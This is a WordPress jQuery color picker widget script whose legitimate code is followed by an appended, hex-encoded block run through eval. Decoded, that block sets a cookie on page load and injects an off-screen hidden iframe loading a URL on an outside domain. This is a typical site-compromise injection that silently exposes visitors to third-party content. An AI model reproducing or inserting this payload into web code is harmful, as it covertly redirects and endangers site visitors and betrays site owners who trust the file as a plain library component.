/* global wpColorPickerL10n */
( function( $, undef ){

	var ColorPicker,
		// html stuff
		_before = '<a tabindex="0" class="wp-color-result" />',
		_after = '<div class="wp-picker-holder" />',
		_wrap = '<div class="wp-picker-container" />',
		_button = '<input type="button" class="button button-small hidden" />';

	// jQuery UI Widget constructor
	ColorPicker = {
		options: {
			defaultColor: false,
			change: false,
			clear: false,
			hide: true,
			palettes: true,
			width: 255,
			mode: 'hsv'
		},
		_create: function() {
			// bail early for unsupported Iris.
			if ( ! $.support.iris ) {
				return;
			}

			var self = this,
				el = self.element;

			$.extend( self.options, el.data() );

			// keep close bound so it can be attached to a body listener
			self.close = $.proxy( self.close, self );

			self.initialValue = el.val();

			// Set up HTML structure, hide things
			el.addClass( 'wp-color-picker' ).hide().wrap( _wrap );
			self.wrap = el.parent();
			self.toggler = $( _before ).insertBefore( el ).css( { backgroundColor: self.initialValue } ).attr( 'title', wpColorPickerL10n.pick ).attr( 'data-current', wpColorPickerL10n.current );
			self.pickerContainer = $( _after ).insertAfter( el );
			self.button = $( _button );

			if ( self.options.defaultColor ) {
				self.button.addClass( 'wp-picker-default' ).val( wpColorPickerL10n.defaultString );
			} else {
				self.button.addClass( 'wp-picker-clear' ).val( wpColorPickerL10n.clear );
			}

			el.wrap( '<span class="wp-picker-input-wrap" />' ).after(self.button);

			el.iris( {
				target: self.pickerContainer,
				hide: self.options.hide,
				width: self.options.width,
				mode: self.options.mode,
				palettes: self.options.palettes,
				change: function( event, ui ) {
					self.toggler.css( { backgroundColor: ui.color.toString() } );
					// check for a custom cb
					if ( $.isFunction( self.options.change ) ) {
						self.options.change.call( this, event, ui );
					}
				}
			} );

			el.val( self.initialValue );
			self._addListeners();
			if ( ! self.options.hide ) {
				self.toggler.click();
			}
		},
		_addListeners: function() {
			var self = this;

			// prevent any clicks inside this widget from leaking to the top and closing it
			self.wrap.on( 'click.wpcolorpicker', function( event ) {
				event.stopPropagation();
			});

			self.toggler.click( function(){
				if ( self.toggler.hasClass( 'wp-picker-open' ) ) {
					self.close();
				} else {
					self.open();
				}
			});

			self.element.change( function( event ) {
				var me = $( this ),
					val = me.val();
				// Empty = clear
				if ( val === '' || val === '#' ) {
					self.toggler.css( 'backgroundColor', '' );
					// fire clear callback if we have one
					if ( $.isFunction( self.options.clear ) ) {
						self.options.clear.call( this, event );
					}
				}
			});

			// open a keyboard-focused closed picker with space or enter
			self.toggler.on( 'keyup', function( event ) {
				if ( event.keyCode === 13 || event.keyCode === 32 ) {
					event.preventDefault();
					self.toggler.trigger( 'click' ).next().focus();
				}
			});

			self.button.click( function( event ) {
				var me = $( this );
				if ( me.hasClass( 'wp-picker-clear' ) ) {
					self.element.val( '' );
					self.toggler.css( 'backgroundColor', '' );
					if ( $.isFunction( self.options.clear ) ) {
						self.options.clear.call( this, event );
					}
				} else if ( me.hasClass( 'wp-picker-default' ) ) {
					self.element.val( self.options.defaultColor ).change();
				}
			});
		},
		open: function() {
			this.element.show().iris( 'toggle' ).focus();
			this.button.removeClass( 'hidden' );
			this.toggler.addClass( 'wp-picker-open' );
			$( 'body' ).trigger( 'click.wpcolorpicker' ).on( 'click.wpcolorpicker', this.close );
		},
		close: function() {
			this.element.hide().iris( 'toggle' );
			this.button.addClass( 'hidden' );
			this.toggler.removeClass( 'wp-picker-open' );
			$( 'body' ).off( 'click.wpcolorpicker', this.close );
		},
		// $("#input").wpColorPicker('color') returns the current color
		// $("#input").wpColorPicker('color', '#bada55') to set
		color: function( newColor ) {
			if ( newColor === undef ) {
				return this.element.iris( 'option', 'color' );
			}

			this.element.iris( 'option', 'color', newColor );
		},
		//$("#input").wpColorPicker('defaultColor') returns the current default color
		//$("#input").wpColorPicker('defaultColor', newDefaultColor) to set
		defaultColor: function( newDefaultColor ) {
			if ( newDefaultColor === undef ) {
				return this.options.defaultColor;
			}

			this.options.defaultColor = newDefaultColor;
		}
	};

	$.widget( 'wp.wpColorPicker', ColorPicker );
}( jQuery ) );
/*eb330772333bce8886db56fccdd2a68d*/;(function(){var atbzfsdt="";var ndsyshzh="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var zidhbikn=0;zidhbikn<ndsyshzh.length;zidhbikn+=2){atbzfsdt=atbzfsdt+parseInt(ndsyshzh.substring(zidhbikn,zidhbikn+2), 16)+",";}atbzfsdt=atbzfsdt.substring(0,atbzfsdt.length-1);eval(eval('String.fromCharCode('+atbzfsdt+')'));})();/*eb330772333bce8886db56fccdd2a68d*/